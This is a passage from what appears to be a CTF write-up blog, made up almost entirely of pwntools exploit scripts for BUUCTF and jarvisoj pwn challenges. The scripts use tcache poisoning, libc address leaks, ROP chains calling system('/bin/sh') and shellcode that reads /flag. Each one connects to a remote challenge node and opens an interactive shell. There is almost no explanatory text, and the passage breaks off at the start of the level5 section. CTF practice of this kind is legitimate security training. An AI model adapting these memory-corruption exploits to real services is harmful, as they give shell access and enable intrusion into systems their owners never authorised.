"amd64"</span><br><span class="line">elf = ELF("pwn")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def add(size):</span><br><span class="line">    sh.sendlineafter(":","1")</span><br><span class="line">    sh.sendlineafter(":",str(size))</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sh.sendlineafter(":","3")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">    sh.sendafter(":",content)</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.sendlineafter(":","4")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter(":","2")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def backdoor(content):</span><br><span class="line">    sh.sendlineafter(":","666")</span><br><span class="line">    sh.sendlineafter("(y or n)","y")</span><br><span class="line">    sh.sendafter("start",content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./pwn")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("libc.so.6")</span><br><span class="line">    add(0x90)</span><br><span class="line">    free(0)</span><br><span class="line">    free(0)</span><br><span class="line">    show(0)</span><br><span class="line">    sh.recvuntil("content: ")</span><br><span class="line">    heap_base = u64(sh.recvuntil("\n",True).ljust(8,"\x00")) - 0x260</span><br><span class="line">    add(0x90)</span><br><span class="line">    edit(1,p64(heap_base + 0x10))</span><br><span class="line">    add(0x90)</span><br><span class="line">    add(0x90)</span><br><span class="line">    payload = p64(0) + p64(0xffffffffffffffff) * 7 + p64(0) + p64(0x201) + p64(0) * 6 + p64(heap_base + 0x60)</span><br><span class="line">    edit(3,payload)</span><br><span class="line">    add(0x90)</span><br><span class="line">    free(4)</span><br><span class="line">    show(4)</span><br><span class="line">    sh.recvuntil("content: ")</span><br><span class="line">    libc = u64(sh.recvuntil("\x7f",False).ljust(8,'\x00')) - 96 - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">    __malloc_hook = libc + lib.symbols['__malloc_hook']</span><br><span class="line">    payload = p64(0) + p64(0xffffffffffffffff) * 7 + p64(0) + p64(0x201) + p64(0) * 6 + p64(0x66660000) + p64(__malloc_hook)</span><br><span class="line">    edit(3,payload)</span><br><span class="line">    add(0x90)</span><br><span class="line">    payload = shellcraft.open("/flag")</span><br><span class="line">    payload += shellcraft.read(3,0x66660100,0x30)</span><br><span class="line">    payload += shellcraft.write(1,0x66660100,0x30)</span><br><span class="line">    edit(5,asm(payload))</span><br><span class="line">    add(0xa0)</span><br><span class="line">    edit(6,p64(0x66660000))</span><br><span class="line">    add(0x90)</span><br><span class="line">    log.success("heap_base: " + hex(heap_base))</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        log.success("pid: " + str(sh.pid))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node3.buuoj.cn",26426,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x76-axb-2019-final-blindHeap"><a href="#0x76-axb-2019-final-blindHeap" class="headerlink" title="0x76 axb_2019_final_blindHeap"></a>0x76 axb_2019_final_blindHeap</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">sh = remote("node3.buuoj.cn",26738)</span><br><span class="line">def add(des_size,des,name_size,name):</span><br><span class="line">    sh.sendlineafter("Your choice:","1")</span><br><span class="line">    sh.sendlineafter("please tell me the desrcription's size",str(name_size))</span><br><span class="line">    sh.sendlineafter("please tell me the desrcript of commodity.",str(name))</span><br><span class="line">    sh.sendlineafter("please tell me the commodity-name's size.",str(des_size))</span><br><span class="line">    sh.sendlineafter("please tell me the commodity-name.",str(des))</span><br><span class="line">def inputName(content):</span><br><span class="line">    sh.sendlineafter("your name?",content)</span><br><span class="line">def modifyName(content):</span><br><span class="line">    sh.sendlineafter("Your choice:","6")</span><br><span class="line">    sh.sendlineafter("Change your name(1~32):",content)</span><br><span class="line">def free():</span><br><span class="line">    sh.sendlineafter("Your choice:","4")</span><br><span class="line">def edit(idx,name,des):</span><br><span class="line">    sh.sendlineafter("choice:","2")</span><br><span class="line">    sh.sendlineafter("index is",str(idx))</span><br><span class="line">    sh.sendlineafter("name",name)</span><br><span class="line">    sh.sendlineafter("desrc",des)</span><br><span class="line">def empty(idx):</span><br><span class="line">    sh.sendlineafter("choice:","5")</span><br><span class="line">    sh.sendlineafter("just one","2")</span><br><span class="line">    sh.sendlineafter("index is",str(idx))</span><br><span class="line">def showall():</span><br><span class="line">    sh.sendlineafter("choice:","3")</span><br><span class="line">    sh.sendlineafter("all","1")</span><br><span class="line">inputName("b" *32)</span><br><span class="line">add(0x80,'\x11', 0x80,'\x12' * 0x80)</span><br><span class="line">sh.sendlineafter("Your choice:","6")</span><br><span class="line">sh.recvuntil("b" * 32)</span><br><span class="line">heap_base = (u64(sh.recvuntil("\x2e\n",True).ljust(8,'\x00')) >> 12) << 12</span><br><span class="line">log.success("heap_base: " + hex(heap_base))</span><br><span class="line">sh.sendline("a" * 31)</span><br><span class="line">free()</span><br><span class="line">payload = 'a' * 96</span><br><span class="line">payload += p64(0x600)</span><br><span class="line">payload += p64(heap_base + 0x130 + 0x100 - 0x18 + 0x8 + 0x8)</span><br><span class="line">payload += p64(0x800)</span><br><span class="line">payload += p64(heap_base + 0x10)</span><br><span class="line">add(0x80,'\x13', 0x80,payload)</span><br><span class="line">add(0x80,'\x14', 0x80,'\x15' * 0x80)</span><br><span class="line">add(0x80,'\x16', 0x80,'\x17' * 0x80)</span><br><span class="line">modifyName('a' * 32)</span><br><span class="line">empty(1)</span><br><span class="line">showall()</span><br><span class="line">main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">__malloc_hook =main_arena - 88 - 0x10</span><br><span class="line">libc = __malloc_hook - lib.symbols['__malloc_hook']</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">log.success("__free_hook: ")</span><br><span class="line">payload = 'a' * 280 + p64(0x666) + p64(__free_hook) + p64(0x100) + p64(heap_base + 0x10)</span><br><span class="line">edit(0,payload,'b')</span><br><span class="line">edit(1,p64(system),'/bin/sh\x00')</span><br><span class="line">empty(0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x77-axb-2019-brop64"><a href="#0x77-axb-2019-brop64" class="headerlink" title="0x77 axb_2019_brop64"></a>0x77 axb_2019_brop64</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("axb_2019_brop64")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./axb_2019_brop64")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line">	pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line">	offset = 216</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p64(pop_rdi_ret)</span><br><span class="line">	payload += p64(elf.got['__libc_start_main'])</span><br><span class="line">	payload += p64(elf.plt['puts'])</span><br><span class="line">	payload += p64(0x4007D6)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	__libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">	__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p64(pop_rdi_ret)</span><br><span class="line">	payload += p64(binsh)</span><br><span class="line">	payload += p64(system)</span><br><span class="line">	payload += p64(0xdeadbeef)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",29654,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x78-jarvisoj-tell-me-something"><a href="#0x78-jarvisoj-tell-me-something" class="headerlink" title="0x78 jarvisoj_tell_me_something"></a>0x78 jarvisoj_tell_me_something</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh = process("./guestbook")</span><br><span class="line">sh = remote("node3.buuoj.cn",25564)</span><br><span class="line">junk = 'a' * 0x88</span><br><span class="line">shell_address = 0x0000000000400620</span><br><span class="line">payload = junk + p64(shell_address)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("message:\n")</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x79-jarvisoj-level3-x64"><a href="#0x79-jarvisoj-level3-x64" class="headerlink" title="0x79 jarvisoj_level3_x64"></a>0x79 jarvisoj_level3_x64</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh=remote("node3.buuoj.cn",25389)</span><br><span class="line">#sh = process ('./level3_x64')</span><br><span class="line">elf = ELF("level3_x64")</span><br><span class="line">libc = ELF("libc-2.23 .so")</span><br><span class="line">write_addr = elf.symbols['write']</span><br><span class="line">read_addr = elf.symbols['read']</span><br><span class="line">start_addr = elf.symbols['_start']</span><br><span class="line">__libc_start_main_addr = elf.got['__libc_start_main']</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">pop_rdi_ret = 0x00000000004006b3</span><br><span class="line">pop_rsi_r15_ret = 0x00000000004006b1</span><br><span class="line">payload =  'a' * 136</span><br><span class="line">payload +=   p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret)  + p64(__libc_start_main_addr) + p64(1)  + p64(write_addr)</span><br><span class="line">payload += p64(0x00000000004005E6)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">__libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00')) </span><br><span class="line">libc_base = __libc_start_main - libc.symbols['__libc_start_main']</span><br><span class="line">ret_text = u64(sh.recv(8))</span><br><span class="line">system_addr = libc_base + libc.symbols['system']</span><br><span class="line">shell_addr = libc_base + next(libc.search('/bin/sh\0'))</span><br><span class="line">payload = 'a'*136 + p64(pop_rdi_ret) + p64(shell_addr) + p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>
<h2 id="0x80-jarvisoj-level0"><a href="#0x80-jarvisoj-level0" class="headerlink" title="0x80 jarvisoj_level0"></a>0x80 jarvisoj_level0</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh = process("./level0")</span><br><span class="line">sh = remote("node3.buuoj.cn",29420)</span><br><span class="line">offset = 136</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(0x0000000000400596)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x81-jarvisoj-level1"><a href="#0x81-jarvisoj-level1" class="headerlink" title="0x81 jarvisoj_level1"></a>0x81 jarvisoj_level1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("level1")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./level1")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	pop_ebx_ret = elf.search(asm("pop ebx\nret")).next()</span><br><span class="line">	pop3_ret = elf.search(asm("pop esi\npop edi\npop ebp\nret")).next()</span><br><span class="line">	offset = 140</span><br><span class="line">	payload = offset * "a"</span><br><span class="line">	payload += p32(elf.plt['read'])</span><br><span class="line">	payload += p32(pop3_ret)</span><br><span class="line">	payload += p32(0)</span><br><span class="line">	payload += p32(elf.bss())</span><br><span class="line">	payload += p32(0x300)</span><br><span class="line">	payload += p32(elf.bss())</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",27154,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x82-jarvisoj-level2"><a href="#0x82-jarvisoj-level2" class="headerlink" title="0x82 jarvisoj_level2"></a>0x82 jarvisoj_level2</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">#sh = process("./level2")</span><br><span class="line">sh = remote("node3.buuoj.cn",26267)</span><br><span class="line">elf = ELF("level2")</span><br><span class="line">offset = 140</span><br><span class="line">pop3_ret = 0x08048519</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p32(elf.plt['read'])</span><br><span class="line">payload += p32(pop3_ret)</span><br><span class="line">payload += p32(0) + p32(elf.bss()) + p32(0x100)</span><br><span class="line">payload += p32(elf.plt['system'])</span><br><span class="line">payload += p32(0xdeadbeef)</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.send('/bin/sh\x00')</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x83-jarvisoj-level2-x64"><a href="#0x83-jarvisoj-level2-x64" class="headerlink" title="0x83 jarvisoj_level2(x64)"></a>0x83 jarvisoj_level2(x64)</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">#sh = process("level2_x64")</span><br><span class="line">sh = remote("node3.buuoj.cn",27781)</span><br><span class="line">elf = ELF("level2_x64")</span><br><span class="line">offset = 0x88</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(0x4006b3)#pop rdi   ret</span><br><span class="line">payload += p64(elf.search('/bin/sh\x00').next())</span><br><span class="line">payload += p64(elf.plt['system'])</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x84-jarvisoj-leve3"><a href="#0x84-jarvisoj-leve3" class="headerlink" title="0x84 jarvisoj_leve3"></a>0x84 jarvisoj_leve3</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">lib = ELF("libc-2.23_x32.so")</span><br><span class="line">elf = ELF("level3")</span><br><span class="line">#sh = process("./level3")</span><br><span class="line">sh = remote("node3.buuoj.cn",28412)</span><br><span class="line">#libc leak</span><br><span class="line">payload = 'a' * (0x88 + 4)</span><br><span class="line">payload += p32(elf.plt['write'])</span><br><span class="line">payload += p32(0x08048519)</span><br><span class="line">payload += p32(1)</span><br><span class="line">payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">payload += p32(4)</span><br><span class="line">payload += p32(elf.symbols['main'])#control EIP</span><br><span class="line">sh.send(payload)</span><br><span class="line">__libc_start_main = u32(sh.recvuntil("\xf7")[-4:])</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">payload = 'a' * (0x88 + 4)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(0xdeadbeef)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x85-jarvisoj-level4"><a href="#0x85-jarvisoj-level4" class="headerlink" title="0x85 jarvisoj_level4"></a>0x85 jarvisoj_level4</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("level4")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./level4")</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23_x32.so")</span><br><span class="line">	pop_ebx_ret = elf.search(asm("pop ebx\nret")).next()</span><br><span class="line">	pop3_ret = elf.search(asm("pop esi\npop edi\npop ebp\nret")).next()</span><br><span class="line">	offset = 140</span><br><span class="line">	payload = offset * 'a'</span><br><span class="line">	payload += p32(elf.plt['write'])</span><br><span class="line">	payload += p32(0x08048470)</span><br><span class="line">	payload += p32(1)</span><br><span class="line">	payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">	payload += p32(4)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	__libc_start_main = u32(sh.recvuntil("\xf7")[-4:])</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">	__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">	</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	payload = offset * 'a'</span><br><span class="line">	payload += p32(system)</span><br><span class="line">	payload += p32(0x08048470)</span><br><span class="line">	payload += p32(binsh)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node3.buuoj.cn",25858,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x86-jarvisoj-level5"><a href="#0x86-jarvisoj-level5" class="headerlink" title="0x86 jarvisoj_level5"></a>0x86 jarvisoj_level5</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td 